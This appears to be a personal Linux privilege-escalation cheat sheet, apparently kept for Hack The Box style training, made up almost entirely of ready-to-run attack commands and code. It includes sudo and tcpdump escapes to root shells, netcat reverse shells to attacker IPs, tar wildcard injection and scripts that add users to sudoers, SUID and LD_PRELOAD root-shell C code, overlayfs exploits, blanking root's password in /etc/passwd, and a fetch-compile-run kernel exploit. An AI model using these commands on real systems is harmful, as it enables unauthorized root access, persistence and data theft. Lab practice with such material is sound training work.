https://gtfobins.github.io/

ldd custom programs that are owned by root

First try simple sudo:

```
$ sudo su -
```

What can we run with sudo?

```
$ sudo -l

sudo -V
```

if allowed to run a command as sudo like ssh you can run this to get a root shell
```
`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x   `
```

sudo /usr/bin/php -r “system(‘/bin/sh’);”

Try su as all users and the username as password


great walkthrough
file:///tmp/sudo_baron_samedit_doc20240309-79924-u6ymk4.html

```
uname -a
```


always look for .conf and .config, for usernames, passwords, and other secrets
```
find /etc -type f \( -name "*.conf" -o -name "*.config" \)
```

```
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec grep -iHn "password" {} +

```

```
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

```
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```


Find history files

```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

is the shadow file readable?
occasionally hashes will be /etc/passwd

find writable directories
```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
find writable files
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
find all hidden files
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
find all hidden directories
```
find / -type d -name ".*" -ls 2>/dev/null
```
Find program or scripts that run as root S setuid
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
Group ID set
```
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

lsblk to see what drives are unmounted
```
cat /etc/fstab | grep -v "#" | column -t
```

Find writable directories associated with cronjobs
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

What ssservices are running as root?:

```
$ ps aux | grep root
```

```
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

Look for vulnerable/privileged components such as: mysql, sudo, udev, python

If **/etc/exports** if writable, you can add an NFS entry or change and existing entry adding the **no_root_squash** flag to a root directory, put a binary with SUID bit on, and get root.

If there is a **cronjob** that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.

wild card abuse
```
 echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

The following command will list processes running by root, permissions and NFS exports.

```
$ echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
```




Use netstat to find other machines connected

```
$ netstat -ano
```

Command to skip ignored lines in config files

```
$ alias nonempty="egrep -v '^[ \t]*#|^$'"
```

If Mysql is running as root, you can run commands using **sys_exec()**. For instance, to add user to sudoers:

```
sys_exec('usermod -a -G admin username')
```

More about mysql:

```
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

Find linux distribution & version

```
$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;
```

Architecture

```
$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
```

Environment variables

```
$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
```

Find printers

```
$ lpstat -a
```

Find apps installed;

```
$ ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;
```

```
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```


```
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

Find writable configuration files

```
$ find /etc/ -writable -type f 2>/dev/null
```

Miss-configured services

```
$ cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

Scheduled jobs

```
$ crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny
```

```
ls -la /etc/cron.daily/
```


Grep hardcoded passwords

```
$ grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```

if web server run in web root:

```
$ grep "localhost" ./ -R
```

Network configuration

```
$ /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname
```

List other users home directories

```
$ ls -ahlR /root/; ls -ahlR /home/
```

User bash history

```
$ cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history
```

User mails

```
$ cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root
```

Find interesting binaries

```
$ find / -name wget; find / -name nc*; find / -name netcat*; find / -name tftp*; find / -name ftp
```

Mounted filesystems

```
$ mount; df -h; cat /etc/fstab
```

Look for binaries with the SUID or GUID bits set.

```
$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
$ find / -perm -1000 -type d 2>/dev/null
$ find / -perm -g=s -type f 2>/dev/null
```

Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.

```
$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
$ export -f /usr/bin/foo
$ /usr/bin/foo
    It works
```

if you can just change PATH, the following will add a poisoned ssh binary:

```
 set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
 chmod +x ssh
```

Generating SUID C Shell for /bin/bash

```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```

Without interactive shell

```
$ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c
```

If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:

```
$ chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;
```

If /etc/passwd has incorrect permissions, you can root:

```
 $ echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
```

Add user www-data to sudoers with no password

```
$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

If you can sudo chmod:

```
 $echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid
```

Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:

```
https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562
```

compile exploit fix error

```
$ gcc 9545.c -o 9545 -Wl,--hash-style=both
```

Find other uses in the system

```
 $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l
```

World readable/writable files:

```
$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;
```

Find world-readable files:

```
$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
```

Find nobody owned files

```
$ find /dir -xdev \( -nouser -o -nogroup \) -print
```

Add user to sudoers in python.

```
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

Ring0 kernel exploit for 2.3/2.4

```
wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0
```

Inspect web traffic

```
$ tcpdump tcp port 80 -w output.pcap -i eth0
```

sudo -S -l will show what commands your user can run as root

if SSH is allowed to run as root you can run



will give you a root shell


```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay -o rw,lowerdir=l,upperdir=u,workdir=w,metacopy=on m && touch m/*;" && u/python3 -c 'import pty;import os;os.setuid(0); pty.spawn("/bin/bash")'
```

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```

tcpdump sudo rights shell
```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```


```
cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

```
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```


```
nc -lnvp 443
```

shared librarys

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

compile the C code above
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```